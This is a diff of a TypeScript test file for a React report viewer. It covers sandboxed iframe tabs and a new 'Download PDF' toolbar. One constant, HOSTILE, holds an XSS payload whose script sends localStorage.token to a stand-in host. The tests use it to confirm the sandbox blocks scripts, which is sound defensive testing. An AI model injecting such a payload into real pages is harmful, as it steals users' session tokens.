@@ -3,7 +3,10 @@ import { createElement } from "react";
 import { renderToStaticMarkup } from "react-dom/server";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { LINE_META, METRICS_WITHOUT_A_LINE, caughtBy, unattributed } from "./lineMap";
-import { REPORT_SANDBOX, ReportFrame, openReportTab, type TabOpener } from "./reportFrame";
+import {
+  PREPARING_LINE, PRINT_NOTE, REOPEN_LINE, REPORT_SANDBOX, ReportFrame, openReportTab,
+  type ReportPdf, type TabOpener,
+} from "./reportFrame";
 import type {
   MrAskAnswer, MrAskFact, MrBoardCoverageColumn, MrBoardRow, MrReportKind, MrReportPeriods,
 } from "@/lib/api";
@@ -946,32 +949,60 @@ describe("the Ask panel's own words", () => {
 
 const HOSTILE = `<p onclick="steal()">"Q3" & co</p><script>fetch("//x?t="+localStorage.token)</script>`;
 
+type Handlers = Record<string, Array<() => void>>;
+
 /** A blank tab, as much of one as `openReportTab` touches, logging the order
- *  things happen in — the sandbox must be on the frame before its document. */
+ *  things happen in — the sandbox must be on the frame before its document.
+ *  `made` is every element the tab's document created, so a link that was
+ *  clicked and removed can still be read; `fire` raises a window event on
+ *  the console (the opener) or on the tab. */
 function fakeTabs() {
   const log: string[] = [];
   type El = {
     tag: string; attrs: Record<string, string>; textContent: string; children: El[];
-    parent: El | null; setAttribute(k: string, v: string): void; appendChild(c: El): El;
-    remove(): void;
+    parent: El | null; disabled: boolean; handlers: Handlers;
+    setAttribute(k: string, v: string): void; appendChild(c: El): El; remove(): void;
+    addEventListener(type: string, fn: () => void): void; click(): void;
   };
+  const made: El[] = [];
   const el = (tag: string): El => {
     const node: El = {
-      tag, attrs: {}, textContent: "", children: [], parent: null,
+      tag, attrs: {}, textContent: "", children: [], parent: null, disabled: false, handlers: {},
       setAttribute(k, v) { log.push(`set ${tag}.${k}`); node.attrs[k] = v; },
       appendChild(c) { log.push(`mount ${c.tag}`); c.parent = node; node.children.push(c); return c; },
       remove() { if (node.parent) node.parent.children = node.parent.children.filter((x) => x !== node); },
+      addEventListener(type, fn) { (node.handlers[type] ??= []).push(fn); },
+      click() { log.push(`click ${tag}`); for (const fn of node.handlers.click ?? []) fn(); },
     };
+    made.push(node);
     return node;
   };
   const doc = { title: "", head: el("head"), body: el("body"), createElement: el };
-  const tab = { opener: {} as unknown, document: doc, closed: false, close() { tab.closed = true; } };
+  const tabHandlers: Handlers = {};
+  const tab = {
+    opener: {} as unknown, document: doc, closed: false, close() { tab.closed = true; },
+    addEventListener(type: string, fn: () => void) { (tabHandlers[type] ??= []).push(fn); },
+  };
+  const consoleHandlers: Handlers = {};
   const open = vi.fn((..._args: unknown[]) => tab);
-  return { opener: { open } as unknown as TabOpener, open, tab, doc, log };
+  const opener = {
+    open,
+    addEventListener(type: string, fn: () => void) { (consoleHandlers[type] ??= []).push(fn); },
+    removeEventListener(type: string, fn: () => void) {
+      consoleHandlers[type] = (consoleHandlers[type] ?? []).filter((f) => f !== fn);
+    },
+  } as unknown as TabOpener;
+  const fire = (where: "console" | "tab", type: string) => {
+    for (const fn of (where === "console" ? consoleHandlers : tabHandlers)[type] ?? []) fn();
+  };
+  return { opener, open, tab, doc, log, made, fire, consoleHandlers };
 }
 
-const frameIn = (doc: ReturnType<typeof fakeTabs>["doc"]) =>
-  doc.body.children.find((c) => c.tag === "iframe");
+type FakeDoc = ReturnType<typeof fakeTabs>["doc"];
+const frameIn = (doc: FakeDoc) => doc.body.children.find((c) => c.tag === "iframe");
+const toolbarOf = (doc: FakeDoc) => doc.body.children.find((c) => c.attrs.class === "bar");
+const buttonOf = (doc: FakeDoc) => toolbarOf(doc)?.children.find((c) => c.tag === "button");
+const statusOf = (doc: FakeDoc) => toolbarOf(doc)?.children.find((c) => c.attrs.role === "status");
 
 describe("the report viewer is a sandboxed iframe", () => {
   it("grants the report nothing — no scripts, no same-origin", () => {
@@ -992,7 +1023,7 @@ describe("the report viewer is a sandboxed iframe", () => {
 
   it("opens the new tab blank, then mounts the report in the same sandbox — sandbox first", () => {
     const { opener, open, tab, doc, log } = fakeTabs();
-    const handle = openReportTab("Vendor Performance — September 2026", opener);
+    const handle = openReportTab("Vendor Performance — September 2026", null, opener);
     expect(handle).not.toBeNull();
     expect(open).toHaveBeenCalledWith("", "_blank");
     expect(tab.opener).toBeNull();
@@ -1015,14 +1046,163 @@ describe("the report viewer is a sandboxed iframe", () => {
 
   it("says so when the browser blocks the tab, rather than opening anything else", () => {
     const open = vi.fn(() => null);
-    expect(openReportTab("x", { open } as unknown as TabOpener)).toBeNull();
+    expect(openReportTab("x", null, { open } as unknown as TabOpener)).toBeNull();
     expect(open).toHaveBeenCalledTimes(1);
   });
 
   it("closes the tab it opened when the report cannot be fetched", () => {
     const { opener, tab } = fakeTabs();
-    openReportTab("x", opener)!.close();
+    openReportTab("x", null, opener)!.close();
     expect(tab.closed).toBe(true);
+  });
+});
+
+/* --------------------------------------------------------------------------
+   The report tab's "Download PDF".
+
+   A browser prints an iframe only as far as its visible box, so Ctrl+P on the
+   tab printed page one of a report. The toolbar downloads the server-rendered
+   PDF instead. Its handler runs in the console's realm — the same API client,
+   token and error words as the console's own button — so the tab never holds
+   a script, and when the console tab goes the button says to reopen.
+   -------------------------------------------------------------------------- */
+
+describe("the report tab's Download PDF", () => {
+  afterEach(() => { vi.restoreAllMocks(); vi.useRealTimers(); });
+
+  /** Let the click handler's promise chain run to its `finally`. */
+  const settle = async () => { for (let i = 0; i < 10; i++) await Promise.resolve(); };
+  const pdfOf = (over: Partial<ReportPdf> = {}): ReportPdf => ({
+    fileName: "mr-vendor-report-2026-09.pdf",
+    unavailable: null,
+    fetchUrl: vi.fn(async () => "blob:console/1"),
+    ...over,
+  });
+
+  it("mounts a toolbar — button, status line, print note — above the still-sandboxed frame, with no script", () => {
+    const { opener, doc } = fakeTabs();
+    const handle = openReportTab("Vendor Performance", pdfOf(), opener)!;
+    const bar = toolbarOf(doc)!;
+    expect(bar.attrs.role).toBe("toolbar");
+    const button = buttonOf(doc)!;
+    expect(button.textContent).toBe("Download PDF");
+    expect(button.attrs.type).toBe("button");
+    expect(button.disabled).toBe(false);
+    const status = statusOf(doc)!;
+    expect(status.attrs.role).toBe("status");
+    expect(status.textContent).toBe("");
+    expect(button.attrs["aria-describedby"]).toBe(status.attrs.id);
+    const note = doc.body.children.find((c) => c.attrs.class === "print-note")!;
+    expect(note.textContent).toBe(PRINT_NOTE);
+
+    handle.show(HOSTILE);
+    const frame = frameIn(doc)!;
+    expect(frame.attrs.sandbox).toBe(REPORT_SANDBOX);
+    expect(frame.attrs.srcdoc).toBe(HOSTILE);
+    // The toolbar precedes the frame: that is what `.bar~iframe` keys on.
+    expect(doc.body.children.indexOf(bar)).toBeLessThan(doc.body.children.indexOf(frame));
+    const tags = [...doc.head.children, ...doc.body.children].map((c) => c.tag);
+    expect(tags).not.toContain("script");
+  });
+
+  it("gives the frame the height under the toolbar, and prints the note instead of either", () => {
+    const { opener, doc } = fakeTabs();
+    openReportTab("x", pdfOf(), opener);
+    const css = doc.head.children.map((c) => c.textContent).join("");
+    expect(css).toContain(".bar~iframe{height:calc(100vh - 48px)}");
+    expect(css).toMatch(/@media print\{\.bar,\.wait,iframe\{display:none\}\.print-note\{display:block/);
+    // System colours only — the tab has none of the console's tokens.
+    expect(css).not.toMatch(/#[0-9a-f]{3,8}\b|rgb\(|hsl\(/i);
+  });
+
+  it("disables the button and shows the server's reason verbatim when PDF export is not set up", () => {
+    const reason = "PDF export isn't set up on this server yet (RENDERER_URL is unset).";
+    const fetchUrl = vi.fn(async () => "blob:never");
+    const { opener, doc, made } = fakeTabs();
+    openReportTab("x", pdfOf({ unavailable: reason, fetchUrl }), opener);
+    expect(buttonOf(doc)!.disabled).toBe(true);
+    expect(statusOf(doc)!.textContent).toBe(reason);
+    buttonOf(doc)!.click();
+    expect(fetchUrl).not.toHaveBeenCalled();
+    expect(made.find((n) => n.tag === "a")).toBeUndefined();
+  });
+
+  it("shows the server's error text and saves nothing when the fetch fails", async () => {
+    const fetchUrl = vi.fn(async (): Promise<string> => {
+      throw new Error("PDF renderer unavailable: RENDERER_URL is unset.");
+    });
+    const { opener, doc, log, made } = fakeTabs();
+    openReportTab("x", pdfOf({ fetchUrl }), opener);
+    buttonOf(doc)!.click();
+    expect(buttonOf(doc)!.disabled).toBe(true);
+    expect(statusOf(doc)!.textContent).toBe(PREPARING_LINE);
+    await settle();
+    expect(fetchUrl).toHaveBeenCalledTimes(1);
+    expect(statusOf(doc)!.textContent).toBe("PDF renderer unavailable: RENDERER_URL is unset.");
+    expect(buttonOf(doc)!.disabled).toBe(false);
+    expect(made.find((n) => n.tag === "a")).toBeUndefined();
+    expect(log).not.toContain("click a");
+  });
+
+  it("on success clicks an <a download> made in the tab's own document, then revokes the URL", async () => {
+    vi.useFakeTimers({ toFake: ["setTimeout"] });
+    const revoke = vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
+    const { opener, doc, log, made } = fakeTabs();
+    openReportTab("x", pdfOf(), opener);
+    buttonOf(doc)!.click();
+    await settle();
+    const link = made.find((n) => n.tag === "a")!;
+    expect(link.attrs.href).toBe("blob:console/1");
+    expect(link.attrs.download).toBe("mr-vendor-report-2026-09.pdf");
+    expect(log.indexOf("mount a")).toBeLessThan(log.indexOf("click a"));
+    expect(doc.body.children).not.toContain(link);
+    expect(statusOf(doc)!.textContent).toContain("mr-vendor-report-2026-09.pdf");
+    expect(buttonOf(doc)!.disabled).toBe(false);
+    expect(revoke).not.toHaveBeenCalled();
+    vi.advanceTimersByTime(10_000);
+    expect(revoke).toHaveBeenCalledWith("blob:console/1");
+  });
+
+  it("ignores a second click while the first is still preparing", async () => {
+    const fetchUrl = vi.fn(async () => "blob:console/2");
+    const { opener, doc } = fakeTabs();
+    openReportTab("x", pdfOf({ fetchUrl }), opener);
+    buttonOf(doc)!.click();
+    buttonOf(doc)!.click();
+    await settle();
+    expect(fetchUrl).toHaveBeenCalledTimes(1);
+  });
+
+  it("once the console tab is gone, turns the button off and says to reopen from the console", () => {
+    const fetchUrl = vi.fn(async () => "blob:x");
+    const { opener, doc, fire } = fakeTabs();
+    openReportTab("x", pdfOf({ fetchUrl }), opener);
+    fire("console", "pagehide");
+    expect(buttonOf(doc)!.disabled).toBe(true);
+    expect(statusOf(doc)!.textContent).toBe(REOPEN_LINE);
+    buttonOf(doc)!.click();
+    expect(fetchUrl).not.toHaveBeenCalled();
+  });
+
+  it("drops its listener on the console when the tab itself closes", () => {
+    const { opener, fire, consoleHandlers } = fakeTabs();
+    openReportTab("x", pdfOf(), opener);
+    expect(consoleHandlers.pagehide).toHaveLength(1);
+    fire("tab", "pagehide");
+    expect(consoleHandlers.pagehide).toHaveLength(0);
+  });
+
+  it("builds the tab from DOM calls and text only, never from HTML strings", () => {
+    const src = sourceOf("./reportFrame.ts");
+    expect(src).not.toMatch(/innerHTML|outerHTML|insertAdjacentHTML|document\.write|createElement\("script"\)/);
+  });
+
+  it("hands both report tabs a PDF fetched through the API client, worded by describeFailure", () => {
+    const reports = sourceOf("./Reports.tsx");
+    expect(reports).toMatch(/fetchUrl: forTab\(\(\) => mrVendorReportPdfUrl\(run\.id\)/);
+    expect(reports).toMatch(/fetchUrl: forTab\(\(\) => mrBoardReportPdfUrl\(report\.id\)/);
+    expect(reports).toMatch(/unavailable: pdfAvailable \? null : \(pdfReason \?\? PDF_OFF_LINE\)/);
+    expect(reports).toContain("throw new Error(describeFailure(e, fallback))");
   });
 });
 
@@ -1046,7 +1226,7 @@ describe("no blob URL of report HTML is ever opened", () => {
   it("opens a tab only ever on the blank page, never on a blob: or data: URL", () => {
     const objectUrl = vi.spyOn(URL, "createObjectURL");
     const { opener, open } = fakeTabs();
-    openReportTab("Board Report", opener)!.show(HOSTILE);
+    openReportTab("Board Report", null, opener)!.show(HOSTILE);
     for (const call of open.mock.calls) expect(String(call[0])).not.toMatch(/^(blob|data):/);
     expect(open.mock.calls).toEqual([["", "_blank"]]);
     expect(objectUrl).not.toHaveBeenCalled();
@@ -1070,7 +1250,7 @@ describe("no blob URL of report HTML is ever opened", () => {
     expect(reports).toMatch(/read=\{\(\) => mrBoardReportHtml\(report\.id\)\}/);
     expect(reports).toContain("<ReportFrame key={run.id} html={html.data}");
     // …which opens the tab before it awaits anything, so it is not a blocked popup.
-    expect(reports).toMatch(/const tab = openReportTab\(title\);[\s\S]{0,400}tab\.show\(await read\(\)\)/);
+    expect(reports).toMatch(/const tab = openReportTab\(title, pdf \?\? null\);[\s\S]{0,400}tab\.show\(await read\(\)\)/);
   });
 });
 
